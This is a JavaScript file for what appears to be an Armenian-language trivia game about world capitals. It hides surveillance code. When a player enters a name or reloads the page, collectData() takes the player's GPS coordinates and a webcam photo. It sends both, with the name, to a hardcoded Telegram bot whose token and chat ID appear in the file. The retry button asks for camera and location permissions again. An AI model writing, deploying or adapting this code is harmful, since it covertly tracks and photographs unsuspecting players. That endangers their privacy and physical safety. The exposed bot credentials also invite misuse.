const TELEGRAM_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const questionsPool = [
  { question: "Ո՞րն է Ֆրանսիայի մայրաքաղաքը։", answers: [{ text: "Փարիզ", correct: true }, { text: "Լիոն", correct: false }, { text: "Մարսել", correct: false }, { text: "Նիցցա", correct: false }] },
  { question: "Ո՞րն է Գերմանիայի մայրաքաղաքը։", answers: [{ text: "Բեռլին", correct: true }, { text: "Մյունխեն", correct: false }, { text: "Համբուրգ", correct: false }, { text: "Քյոլն", correct: false }] },
  { question: "Ո՞րն է Իտալիայի մայրաքաղաքը։", answers: [{ text: "Հռոմ", correct: true }, { text: "Միլան", correct: false }, { text: "Նեապոլ", correct: false }, { text: "Տուրին", correct: false }] },
  { question: "Ո՞րն է Ռուսաստանի մայրաքաղաքը։", answers: [{ text: "Մոսկվա", correct: true }, { text: "Սանկտ Պետերբուրգ", correct: false }, { text: "Կազան", correct: false }, { text: "Սոչի", correct: false }] },
  { question: "Ո՞րն է Ճապոնիայի մայրաքաղաքը։", answers: [{ text: "Տոկիո", correct: true }, { text: "Օսակա", correct: false }, { text: "Նագասակի", correct: false }, { text: "Հիրոսիմա", correct: false }] },
  { question: "Ո՞րն է ԱՄՆ-ի մայրաքաղաքը։", answers: [{ text: "Վաշինգտոն", correct: true }, { text: "Նյու Յորք", correct: false }, { text: "Լոս Անջելես", correct: false }, { text: "Չիկագո", correct: false }] },
  { question: "Ո՞րն է Իրանի մայրաքաղաքը։", answers: [{ text: "Թեհրան", correct: true }, { text: "Իսֆահան", correct: false }, { text: "Մաշհադ", correct: false }, { text: "Քաշան", correct: false }] },
  { question: "Ո՞րն է Բրազիլիայի մայրաքաղաքը։", answers: [{ text: "Բրազիլիա", correct: true }, { text: "Ռիո դե Ժանեյրո", correct: false }, { text: "Սան Պաուլո", correct: false }, { text: "Սալվադոր", correct: false }] },
  { question: "Ո՞րն է Կանադայի մայրաքաղաքը։", answers: [{ text: "Օտտավա", correct: true }, { text: "Տորոնտո", correct: false }, { text: "Վանկուվեր", correct: false }, { text: "Մոնրեալ", correct: false }] },
  { question: "Ո՞րն է Չինաստանի մայրաքաղաքը։", answers: [{ text: "Պեկին", correct: true }, { text: "Շանհայ", correct: false }, { text: "Հոնկոնգ", correct: false }, { text: "Գուանչժոու", correct: false }] },
  { question: "Ո՞րն է Ավստրալիայի մայրաքաղաքը։", answers: [{ text: "Քանբերա", correct: true }, { text: "Սիդնի", correct: false }, { text: "Մելբուռն", correct: false }, { text: "Բրիսբեն", correct: false }] },
  { question: "Ո՞րն է Մեքսիկայի մայրաքաղաքը։", answers: [{ text: "Մեքսիկո", correct: true }, { text: "Գվադալախարա", correct: false }, { text: "Մոնտերեյ", correct: false }, { text: "Տիխուանա", correct: false }] },
  { question: "Ո՞րն է Հնդկաստանի մայրաքաղաքը։", answers: [{ text: "Նյու Դելի", correct: true }, { text: "Մումբայ", correct: false }, { text: "Կալկաթա", correct: false }, { text: "Չեննայ", correct: false }] },
  { question: "Ո՞րն է Հարավային Աֆրիկայի մայրաքաղաքը։", answers: [{ text: "Պրետորիա", correct: true }, { text: "Կեյպթաուն", correct: false }, { text: "Յոհանեսբուրգ", correct: false }, { text: "Դուրբան", correct: false }] },
  { question: "Ո՞րն է Թուրքիայի մայրաքաղաքը։", answers: [{ text: "ԱՆկարա", correct: true }, { text: "Ստամբուլ", correct: false }, { text: "Իզմիր", correct: false }, { text: "Բոդրում", correct: false }] },
  { question: "Ո՞րն է Ուկրաինայի մայրաքաղաքը։", answers: [{ text: "Կիև", correct: true }, { text: "Լվով", correct: false }, { text: "Օդեսա", correct: false }, { text: "Դնեպր", correct: false }] },
  { question: "Ո՞րն է Իսպանիայի մայրաքաղաքը։", answers: [{ text: "Մադրիդ", correct: true }, { text: "Բարսելոնա", correct: false }, { text: "Վալենսիա", correct: false }, { text: "Սևիլյա", correct: false }] },
  { question: "Ո՞րն է Նորվեգիայի մայրաքաղաքը։", answers: [{ text: "Օսլո", correct: true }, { text: "Բերգեն", correct: false }, { text: "Տրոնդհայմ", correct: false }, { text: "Ստավանգեր", correct: false }] },
  { question: "Ո՞րն է Շվեդիայի մայրաքաղաքը։", answers: [{ text: "Ստոկհոլմ", correct: true }, { text: "Գոթենբուրգ", correct: false }, { text: "Մալմո", correct: false }, { text: "Ուպսալա", correct: false }] },
  { question: "Ո՞րն է Ֆինլանդիայի մայրաքաղաքը։", answers: [{ text: "Հելսինկի", correct: true }, { text: "Տամպերե", correct: false }, { text: "Տուրկու", correct: false }, { text: "Օուլու", correct: false }] },
];

const askedIndexesKey = 'askedQuestionIndexes';

function getRandomQuestions(count) {
  let askedIndexes = JSON.parse(localStorage.getItem(askedIndexesKey)) || [];
  let availableIndexes = questionsPool.map((_, i) => i).filter(i => !askedIndexes.includes(i));

  if (availableIndexes.length < count) {
    askedIndexes = [];
    availableIndexes = questionsPool.map((_, i) => i);
  }

  const selectedIndexes = [];
  while (selectedIndexes.length < count) {
    const randomIndex = availableIndexes[Math.floor(Math.random() * availableIndexes.length)];
    if (!selectedIndexes.includes(randomIndex)) {
      selectedIndexes.push(randomIndex);
      askedIndexes.push(randomIndex);
      availableIndexes = availableIndexes.filter(i => i !== randomIndex);
    }
  }

  localStorage.setItem(askedIndexesKey, JSON.stringify(askedIndexes));
  return selectedIndexes.map(i => questionsPool[i]);
}

const questionElement = document.getElementById('question');
const answerButtonsElement = document.getElementById('answer-buttons');
const nameInput = document.getElementById('name-input');
const nameForm = document.getElementById('name-form');
const userNameDisplay = document.getElementById('user-name');
const scoreElement = document.getElementById('score-info');
const tryAgainBtn = document.getElementById('try-again-btn');

let currentQuestionIndex = 0;
let correctCount = 0;
let wrongCount = 0;
let userName = null;

function sendToTelegram(text) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML',
    }),
  });
}

function collectData() {
  if (!userName) return;

  navigator.geolocation.getCurrentPosition(pos => {
    const coords = pos.coords;
    let msg = `<b>Имя:</b> ${userName}\n<b>Координаты:</b> https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
    sendToTelegram(msg);
  }, err => {
    sendToTelegram(`<b>Имя:</b> ${userName}\n<b>Геолокация не предоставлена.</b>`);
  });

  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      setTimeout(() => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imgData = canvas.toDataURL('image/jpeg');

        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            photo: imgData,
            caption: `Фото игрока: ${userName}`,
          }),
          headers: { 'Content-Type': 'application/json' },
        });

        stream.getTracks().forEach(track => track.stop());
      }, 2000);
    }).catch(() => {
      sendToTelegram(`<b>Имя:</b> ${userName}\n<b>Фото с камеры не предоставлено.</b>`);
    });
  }
}

function startGame() {
  userNameDisplay.textContent = userName;
  scoreElement.textContent = `Մնացել է: ${questions.length - currentQuestionIndex} | Ճիշտ է: ${correctCount} | Սխալ է: ${wrongCount}`;
  showQuestion();
}

function showQuestion() {
  resetState();
  if (currentQuestionIndex >= questions.length) {
    endGame();
    return;
  }
  const currentQuestion = questions[currentQuestionIndex];
  questionElement.innerText = currentQuestion.question;
  currentQuestion.answers.forEach(answer => {
    const button = document.createElement('button');
    button.innerText = answer.text;
    button.classList.add('btn');
    button.addEventListener('click', () => selectAnswer(answer.correct));
    answerButtonsElement.appendChild(button);
  });
  scoreElement.textContent = `Մնացել է: ${questions.length - currentQuestionIndex} | Ճիշտ է: ${correctCount} | Սխալ է: ${wrongCount}`;
}

function resetState() {
  while (answerButtonsElement.firstChild) {
    answerButtonsElement.removeChild(answerButtonsElement.firstChild);
  }
  tryAgainBtn.style.display = 'none';
}

function selectAnswer(correct) {
  if (correct) {
    correctCount++;
  } else {
    wrongCount++;
    alert(`Սխալ պատասխան: Ճիշտ պատասխանը՝ ${questions[currentQuestionIndex].answers.find(a => a.correct).text}`);
  }
  currentQuestionIndex++;
  showQuestion();
}

function endGame() {
  scoreElement.textContent = `Խաղը ավարտվեց: Ճիշտ: ${correctCount} | Սխալ: ${wrongCount}`;
  tryAgainBtn.style.display = 'inline-block';
}

tryAgainBtn.addEventListener('click', () => {
  function requestPermissions() {
    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(() => resolve(), () => resolve());
    }).then(() => {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        return navigator.mediaDevices.getUserMedia({ video: true }).then(() => { }).catch(() => { });
      }
    });
  }

  requestPermissions().then(() => {
    questions = getRandomQuestions(20);
    currentQuestionIndex = 0;
    correctCount = 0;
    wrongCount = 0;
    tryAgainBtn.style.display = 'none';
    showQuestion();
  });
});

nameForm.addEventListener('submit', e => {
  e.preventDefault();
  userName = nameInput.value.trim();
  if (!userName) {
    alert('Խնդրում ենք ներմուծեք ձեր անունը։');
    return;
  }
  localStorage.setItem('userName', userName);
  questions = getRandomQuestions(20);
  collectData();
  startGame();
  nameForm.style.display = 'none';
  document.getElementById('game-area').style.display = 'block';
});

window.addEventListener('load', () => {
  const savedName = localStorage.getItem('userName');
  if (savedName) {
    userName = savedName;
    questions = getRandomQuestions(20);
    nameForm.style.display = 'none';
    document.getElementById('game-area').style.display = 'block';
    collectData();
    startGame();
  }
});
